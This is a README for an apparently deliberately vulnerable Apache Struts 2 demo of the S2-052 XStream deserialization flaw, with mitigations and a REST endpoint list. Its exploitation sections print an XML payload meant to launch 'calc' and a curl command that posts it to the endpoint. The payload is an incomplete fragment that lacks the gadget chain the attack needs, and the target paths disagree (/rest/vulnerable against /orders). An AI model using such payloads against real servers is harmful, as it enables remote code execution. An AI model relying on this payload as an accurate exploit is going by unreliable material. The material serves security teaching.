# S2-052 Vulnerability Demonstration

## Overview
S2-052 is a critical vulnerability in Apache Struts 2 that allows Remote Code Execution (RCE) due to improper deserialization of XML payloads. The issue arises because the REST Plugin uses a `XStreamHandler` with an instance of XStream for deserialization without any type filtering. This allows attackers to send malicious XML payloads that can execute arbitrary code on the server.

## Exploitation Steps
1. **Deploy the Application**:
   - Build the project using Maven: `mvn clean package`.
   - Deploy the generated WAR file to a servlet container (e.g., Apache Tomcat).

2. **Access the Vulnerable Endpoint**:
   - Identify the REST endpoint configured in the application, such as `/orders`.

3. **Craft the Malicious Payload**:
   - Create an XML payload designed to exploit the deserialization vulnerability. For example:
     ```xml
     <map>
       <entry>
         <jdk.nashorn.internal.objects.NativeString>
           <flags>0</flags>
           <value>calc</value>
         </jdk.nashorn.internal.objects.NativeString>
         <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
       </entry>
     </map>
     ```

4. **Send the Exploit**:
   - Use a tool like `curl` or a custom script to send the malicious XML payload to the vulnerable REST endpoint.
     ```bash
     curl -X POST -H "Content-Type: application/xml" -d @payload.xml http://<server>:<port>/rest/vulnerable
     ```

5. **Observe the Result**:
   - Check the server logs or observe the system behavior to confirm the execution of the payload.

## Mitigation
To secure the application:
1. **Upgrade Struts**:
   - Update to a patched version of Apache Struts 2 where this vulnerability has been addressed.

2. **Enable Type Filtering**:
   - Configure XStream to use type filtering to prevent deserialization of arbitrary classes.

3. **Validate Input**:
   - Ensure all incoming XML payloads are validated against a strict schema.

4. **Use Security Plugins**:
   - Employ security plugins or WAF (Web Application Firewall) to detect and block malicious requests.

## REST Endpoints

The following REST endpoints are exposed by the `OrdersController` class:

1. **GET /orders**
   - Retrieves a list of all orders.

2. **GET /orders/{id}**
   - Retrieves details of a specific order by its ID.

3. **POST /orders**
   - Creates a new order.
   - Example payload:
     ```json
     {
       "clientName": "John Doe",
       "orderDetails": "Sample order details"
     }
     ```

4. **PUT /orders/{id}**
   - Updates an existing order by its ID.
   - Example payload:
     ```json
     {
       "clientName": "Jane Doe",
       "orderDetails": "Updated order details"
     }
     ```

5. **DELETE /orders/{id}**
   - Deletes an order by its ID.

6. **GET /orders/{id}/edit**
   - Retrieves the edit form for a specific order.

7. **GET /orders/new**
   - Retrieves the form to create a new order.

8. **GET /orders/{id}/deleteConfirm**
   - Retrieves the confirmation page for deleting an order.

## Demonstrating the Vulnerability Path

The vulnerability in S2-052 can be demonstrated through the following path:

1. **REST Plugin Configuration**:
   - The `struts.xml` file configures the `rest-showcase` package to extend `rest-default`, enabling the Struts 2 REST plugin.
     ```xml
     <constant name="struts.convention.default.parent.package" value="rest-showcase"/>
     <package name="rest-showcase" extends="rest-default">
     ```

2. **OrdersController**:
   - The `OrdersController` class handles REST requests for managing orders. It includes endpoints such as `POST /orders` and `PUT /orders/{id}`.
   - These endpoints process incoming data, which could include malicious XML payloads if deserialization is performed without type filtering.

3. **Vulnerable Endpoint**:
   - The `create` method in `OrdersController` processes `POST /orders` requests. This method is vulnerable to S2-052 if the REST plugin's `XStreamHandler` is used for deserialization without type filtering.
     ```java
     public HttpHeaders create() {
         log.debug("Processing XML payload for new order");
         // Simulate XML deserialization vulnerability
         ordersService.save(model);
         addActionMessage("New order created successfully");
         return new DefaultHttpHeaders("success")
             .setLocationId(model.getId());
     }
     ```

4. **Exploitation**:
   - An attacker can send a crafted XML payload to the `POST /orders` endpoint to exploit the deserialization vulnerability.
   - Example payload:
     ```xml
     <map>
       <entry>
         <jdk.nashorn.internal.objects.NativeString>
           <flags>0</flags>
           <value>calc</value>
         </jdk.nashorn.internal.objects.NativeString>
         <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
       </entry>
     </map>
     ```

5. **REST Call**:
   - Use a tool like `curl` to send the malicious payload:
     ```bash
     curl -X POST -H "Content-Type: application/xml" -d @payload.xml http://<server>:<port>/orders
     ```

## Disclaimer
This project is for educational purposes only. Exploiting vulnerabilities without proper authorization is illegal and unethical.